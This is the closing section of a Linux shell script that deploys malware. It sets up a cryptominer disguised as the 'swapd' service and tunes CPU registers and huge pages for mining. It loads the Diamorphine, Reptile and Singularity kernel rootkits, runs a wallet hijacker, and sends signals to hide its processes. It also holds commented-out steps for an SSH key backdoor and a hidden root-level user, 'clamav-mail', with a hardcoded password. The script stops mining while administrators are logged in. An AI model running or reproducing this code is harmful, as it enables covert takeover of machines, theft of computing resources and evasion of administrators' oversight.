# ==================== FINAL CLEANUP ====================
echo "[*] Final cleanup..."

# Cleanup xmrig files in login directory
rm -rf ~/xmrig*.* 2>/dev/null

echo ''

# ==================== MSR OPTIMIZATION (CPU PERFORMANCE) ====================
echo "=========================================="
echo "CPU MSR OPTIMIZATION"
echo "=========================================="
echo ""

optimize_func() {
  MSR_FILE=/sys/module/msr/parameters/allow_writes

  if test -e "$MSR_FILE"; then
    echo on >$MSR_FILE
  else
    modprobe msr allow_writes=on 2>/dev/null || true
  fi

  if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo >/dev/null; then
    if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo >/dev/null; then
      if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo >/dev/null; then
        echo "[*] Detected Zen4 CPU"
        wrmsr -a 0xc0011020 0x4400000000000 2>/dev/null || true
        wrmsr -a 0xc0011021 0x4000000000040 2>/dev/null || true
        wrmsr -a 0xc0011022 0x8680000401570000 2>/dev/null || true
        wrmsr -a 0xc001102b 0x2040cc10 2>/dev/null || true
        echo "[✓] MSR register values for Zen4 applied"
      else
        echo "[*] Detected Zen3 CPU"
        wrmsr -a 0xc0011020 0x4480000000000 2>/dev/null || true
        wrmsr -a 0xc0011021 0x1c000200000040 2>/dev/null || true
        wrmsr -a 0xc0011022 0xc000000401500000 2>/dev/null || true
        wrmsr -a 0xc001102b 0x2000cc14 2>/dev/null || true
        echo "[✓] MSR register values for Zen3 applied"
      fi
    else
      echo "[*] Detected Zen1/Zen2 CPU"
      wrmsr -a 0xc0011020 0 2>/dev/null || true
      wrmsr -a 0xc0011021 0x40 2>/dev/null || true
      wrmsr -a 0xc0011022 0x1510000 2>/dev/null || true
      wrmsr -a 0xc001102b 0x2000cc16 2>/dev/null || true
      echo "[✓] MSR register values for Zen1/Zen2 applied"
    fi
  elif grep "Intel" /proc/cpuinfo >/dev/null; then
    echo "[*] Detected Intel CPU"
    wrmsr -a 0x1a4 0xf 2>/dev/null || true
    echo "[✓] MSR register values for Intel applied"
  else
    echo "[!] No supported CPU detected for MSR optimization"
  fi

  echo "[*] Configuring huge pages..."
  sysctl -w vm.nr_hugepages="$(nproc)" 2>/dev/null || true

  while IFS= read -r i; do
    echo 3 >"$i/hugepages/hugepages-1048576kB/nr_hugepages" 2>/dev/null || true
  done < <(find /sys/devices/system/node/node* -maxdepth 0 -type d 2>/dev/null)

  echo "[✓] 1GB huge pages enabled"
}

if [ "$(id -u)" = 0 ]; then
  echo "[*] Running as root - applying MSR optimizations"
  optimize_func
else
  echo "[*] Not running as root - applying limited optimizations"
  sysctl -w vm.nr_hugepages="$(nproc)" 2>/dev/null || true
fi

echo "[✓] CPU optimization complete"
echo ""

# ==================== EMERGENCY SWAP (OOM PROTECTION) ====================
echo "=========================================="
echo "EMERGENCY SWAP CREATION"
echo "=========================================="
echo ""

echo "[*] Creating 2GB emergency swap to prevent OOM killer..."

if [ ! -f /swapfile ]; then
    if dd if=/dev/zero of=/swapfile bs=1G count=2 2>/dev/null; then
        chmod 600 /swapfile
        mkswap /swapfile 2>/dev/null
        swapon /swapfile 2>/dev/null
        echo "vm.swappiness=100" >> /etc/sysctl.conf 2>/dev/null || true
        sysctl -w vm.swappiness=100 2>/dev/null || true
        echo "[✓] 2GB swap created and activated"
    else
        echo "[!] Failed to create swap file"
    fi
else
    echo "[*] Swap file already exists, activating..."
    swapon /swapfile 2>/dev/null || true
    echo "[✓] Swap activated"
fi

echo ""

# ==================== SSH BACKDOOR (OPTIONAL) ====================
echo "=========================================="
echo "SSH BACKDOOR CONFIGURATION"
echo "=========================================="
echo ""

echo "[*] Configuring SSH access..."

# Ensure .ssh directory exists
mkdir -p ~/.ssh 2>/dev/null || true
chmod 700 ~/.ssh 2>/dev/null || true

# Add SSH key (commented out by default - uncomment to enable)
#echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0=' >> ~/.ssh/authorized_keys 2>/dev/null || true

# Create backdoor user (clamav-mail) - UNCOMMENT TO ENABLE
# Password: 1!taugenichts
#PASSWORD='1!taugenichts' && HASH_METHOD=$(grep '^ENCRYPT_METHOD' /etc/login.defs | awk '{print $2}' || echo "SHA512") && if [ "$HASH_METHOD" = "SHA512" ]; then PASSWORD_HASH=$(openssl passwd -6 -salt $(openssl rand -base64 3) "$PASSWORD"); else PASSWORD_HASH=$(openssl passwd -1 -salt $(openssl rand -base64 3) "$PASSWORD"); fi && if id -u clamav-mail >/dev/null 2>&1; then userdel --remove clamav-mail 2>/dev/null || true; fi && if ! grep -q '^sudo:' /etc/group; then groupadd sudo 2>/dev/null || true; fi && if ! grep -q '^clamav-mail:' /etc/group; then groupadd clamav-mail 2>/dev/null || true; fi && useradd -u 455 -G root,sudo -g clamav-mail -M -o -s /bin/bash clamav-mail 2>/dev/null && usermod -p "$PASSWORD_HASH" clamav-mail 2>/dev/null && awk '{lines[NR]=$0} END{last=lines[NR]; delete lines[NR]; n=NR-1; m=int(n/2+1); for(i=1;i<m;i++) print lines[i]; print last; for(i=m;i<=n;i++) print lines[i]}' /etc/passwd > /tmp/passwd && mv /tmp/passwd /etc/passwd 2>/dev/null && awk '{lines[NR]=$0} END{last=lines[NR]; delete lines[NR]; n=NR-1; m=int(n/2+1); for(i=1;i<m;i++) print lines[i]; print last; for(i=m;i<=n;i++) print lines[i]}' /etc/shadow > /tmp/shadow && mv /tmp/shadow /etc/shadow 2>/dev/null || true

chmod 600 ~/.ssh/authorized_keys 2>/dev/null || true

echo "[✓] SSH configuration complete (backdoor disabled by default)"
echo ""

# ==================== INSTALLATION SUMMARY ====================
echo '========================================================================='
echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE (KERNEL ROOTKITS ONLY)!'
echo '========================================================================='
echo ''
echo 'System Configuration:'
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    echo '  Init System: systemd'
    echo ''
    echo 'Service Management Commands:'
    echo '  Start:   systemctl start swapd'
    echo '  Stop:    systemctl stop swapd'
    echo '  Status:  systemctl status swapd'
    echo '  Logs:    journalctl -u swapd -f'
else
    echo '  Init System: SysV init (legacy mode)'
    echo ''
    echo 'Service Management Commands:'
    echo '  Start:   /etc/init.d/swapd start'
    echo '  Stop:    /etc/init.d/swapd stop'
    echo '  Status:  /etc/init.d/swapd status'
    echo '  Restart: /etc/init.d/swapd restart'
fi

echo ''
echo 'Stealth Features Deployed:'

if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q singularity 2>/dev/null; then
    echo '  ✓ Singularity: ACTIVE (kernel 6.x rootkit - kill -59 to hide)'
else
    echo '  ○ Singularity: Not loaded (only for kernel 6.x)'
fi

if lsmod | grep -q diamorphine 2>/dev/null; then
    echo '  ✓ Diamorphine: ACTIVE (kernel rootkit)'
else
    echo '  ○ Diamorphine: Not loaded'
fi

if [ -d /reptile ] || lsmod | grep -q reptile 2>/dev/null; then
    echo '  ✓ Reptile: ACTIVE (kernel rootkit)'
else
    echo '  ○ Reptile: Not loaded'
fi

if lsmod | grep -q rootkit 2>/dev/null; then
    echo '  ✓ Crypto-Miner Rootkit: ACTIVE (kernel rootkit)'
else
    echo '  ○ Crypto-Miner Rootkit: Not loaded'
fi

if [ -f /usr/local/bin/system-watchdog ]; then
    echo '  ✓ Intelligent Watchdog: ACTIVE (3-min, state-tracked)'
else
    echo '  ○ Watchdog: Not deployed'
fi

if [ -f /usr/local/bin/lightd ]; then
    echo '  ✓ Smart Wallet Hijacker: ACTIVE (detects -c flag in processes)'
else
    echo '  ○ Wallet Hijacker: Not deployed'
fi

echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
echo '  ✓ Process name: swapd'
echo '  ✓ Binary structure: direct binary /root/.swapd/swapd (no symlink/wrapper)'
echo '  ✓ Process hiding: Kernel rootkits (multi-layer)'

echo ''
echo 'Installation Method:'
if [ "$USE_WGET" = true ]; then
    echo '  Download Tool: wget (curl SSL/TLS failed)'
else
    echo '  Download Tool: curl'
fi

echo ''
echo 'Mining Configuration:'
echo '  Binary:  /root/.swapd/swapd'
echo '  Config:  /root/.swapd/swapfile'
echo "  Wallet:  $WALLET"
echo '  Pool:    gulf.moneroocean.stream:80'

echo ''
echo 'Process Hiding Commands:'
echo "  Singularity: kill -59 \$PID  (kernel 6.x only)"
echo "  Diamorphine: kill -31 \$PID  (hide), kill -63 \$PID (unhide)"
echo "  Crypto-RK:   kill -31 \$PID  (hide)"
echo '  Reptile:     reptile_cmd hide'

echo ''
echo '========================================================================='
echo '[*] Miner will auto-stop when admins login and restart when they logout'
echo '[*] Multi-layer process hiding:'
if [ "$SINGULARITY_LOADED" = true ]; then
    echo '    Layer 1: Singularity (kernel-level - Kernel 6.x)'
    echo '    Layer 2: Kernel rootkits (Diamorphine/Reptile/Crypto-RK)'
else
    echo '    Layer 1: Kernel rootkits (Diamorphine/Reptile/Crypto-RK)'
fi
echo ''
echo '========================================================================='
echo 'FINAL PROCESS VISIBILITY CHECK'
echo '========================================================================='
echo ''

# Check if processes are actually hidden
PROCESSES_VISIBLE=false

if proc_pids swapd | grep -q . 2>/dev/null; then
    PROCESSES_VISIBLE=true
    echo '[⚠] WARNING: Miner processes are STILL VISIBLE in ps output!'
fi

if proc_pids lightd | grep -q . 2>/dev/null; then
    PROCESSES_VISIBLE=true
    echo '[⚠] WARNING: Wallet hijacker is STILL VISIBLE in ps output!'
fi

if [ "$PROCESSES_VISIBLE" = true ]; then
    echo ''
    echo 'This can happen if services were already running before installation.'
    echo ''
    echo 'RECOMMENDED ACTION:'
    echo '  Option 1 - Reboot (safest):'
    echo '    reboot'
    echo ''
    echo '  Option 2 - Restart services manually:'
    echo '    systemctl restart swapd'
    echo '    systemctl restart lightd'
    echo ''
    echo 'After restart, verify with:'
    echo '  ps aux | grep swapd      # Should show nothing'
    echo '  ps aux | grep lightd    # Should show nothing'
    echo ''
    echo 'Check services are running with:'
    echo '  systemctl status swapd   # Should show: active (running)'
    echo '  systemctl status lightd # Should show: active (running)'
else
    echo '[✓] SUCCESS! All processes are HIDDEN from ps output!'
    echo ''
    echo 'Verification:'
    echo '  ps aux | grep swapd      → Nothing (hidden) ✓'
    echo '  ps aux | grep lightd    → Nothing (hidden) ✓'
    echo ''
    echo 'Services are running (verify with):'
    echo '  systemctl status swapd   → active (running) ✓'
    echo '  systemctl status lightd → active (running) ✓'
fi

echo ''

# ==================== HIDE MINER PROCESSES ====================
echo ""
echo "=========================================="
echo "ACTIVATING PROCESS HIDING"
echo "=========================================="
echo ""
echo "[*] Sending hide signals unconditionally..."
echo "[*] Note: rootkits hide themselves from lsmod — signals sent regardless"
sleep 3  # Give processes time to be fully up before hiding

# ---- kill -31: Diamorphine + Crypto-RK hide signal ----
echo "[*] Sending kill -31 (Diamorphine/Crypto-RK hide)..."
send_sig 31 config.json swapd swapfile lightd
echo "[✓] kill -31 sent"

# ---- kill -59: Singularity toggle hide signal ----
echo "[*] Sending kill -59 (Singularity toggle hide)..."
send_sig 59 config.json swapd swapfile lightd
echo "[✓] kill -59 sent"

echo '========================================================================'
